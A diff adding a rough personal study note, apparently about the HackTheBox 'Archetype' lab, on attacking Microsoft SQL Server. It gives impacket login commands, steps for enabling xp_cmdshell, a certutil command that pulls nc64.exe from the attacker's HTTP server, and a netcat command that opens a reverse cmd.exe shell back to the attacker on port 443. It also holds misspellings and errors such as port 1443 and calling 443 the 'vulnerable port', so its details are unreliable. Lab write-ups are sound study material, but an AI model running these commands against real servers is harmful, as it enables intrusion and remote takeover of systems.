@@ -1,0 +1,92 @@
+2026-03-31
+
+we are going to talk about how mssql can be attacked 
+
+first you have to see the 'tool/impacket' and 'vulerabilities/smbclient to understand this attack 
+
+this can be made using smbclient to access to the open port 1443
+there you will have acces to any miss configured file, if you are 
+lucky you will find credentials
+
+(@notes- re-using credential or stealing credentials, have to be thru 
+phishing, knowing the pass, steal it, etc...)
+
+from there we use impacket to run specifics comands to abusse that.
+
+then will use msql lenguaje to escalate 
+
+(@note the victim has to be sysadmin, that a miss configuration no user supposed to have that access but if he does, you can make 
+this attack)
+
+--> python3 mssqlclient.py ARCHETYPE/sql_svc@TARGET_IP -windows-aut
+run the impacket comand to acces to the database 
+
+( you have to give credentials to get it)
+
+--> SELECT is_srvrolemember('sysadmin');
+
+this will give you 1 (as true)
+
+
+// this comands may help you with it 
+cheatsheet:
+-> EXEC xp_cmdshell 'net user'; — privOn MSSQL 2005 you may need to reactivate xp_cmdshell
+->first as it’s disabled by default:
+->EXEC sp_configure 'show advanced options', 1; — priv
+->RECONFIGURE; — priv
+->EXEC sp_configure 'xp_cmdshell', 1; — priv
+->RECONFIGURE; — pri
+
+// all of this are ways to make it 
+
+xp_cmdshell = is a way te abuse the mssql and have acces to the OS 
+
+then : 
+-> EXEC sp_configure 'show advanced options', 1;
+-> RECONFIGURE;
+-> sp_configure; - Enabling the sp_configure as stated in the above error message
+-> EXEC sp_configure 'xp_cmdshell', 1;
+-> RECONFIGURE;
+
+now you have acces to execute system commands
+
+with impacket we lunch our http server 
+so it can started listening 
+
+in vimctim computer 
+-> xp_cmdshell "powershell -c pwd
+
+important in this attack we combine multiple tecnique we are going to use a binary file 
+
+https://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post_page-----a2ddc3557403------------------- 
+
+nc64.exe is what we use 
+
+(@note- for this attack if you dennied any 80 port in your machine with the fire walls make sure you desactivated them)
+
+from here you have to start your server listeners with impacket 
+with 
+
+-> sudo nc -lvnp 443
+-> sudo python3 -m http.server 80
+
+and we will started listening on both 
+
+-> EXEC xp_cmdshell 'certutil -urlcache -f http://10.10.14.231/nc64.exe C:\Users\sql_svc\Downloads\nc64.exe';
+
+this is a way, but always do your research for this command 
+
+we should get the respond on our 80 pytho server listener
+
+EXEC xp_cmdshell 'powershell -c "cd C:\Users\sql_svc\Downloads; .\nc64.exe  
+  -e cmd.exe 10.10.14.231 443"';
+
+vulnarable port = 443 
+
+and from here we just escalate 
+
+-> poweshell #in the terminal that we run our 443 listener 
+
+Nc64 biary is a file that make a terminal that give us acces to the victim 
+
+# continue tomorrow 
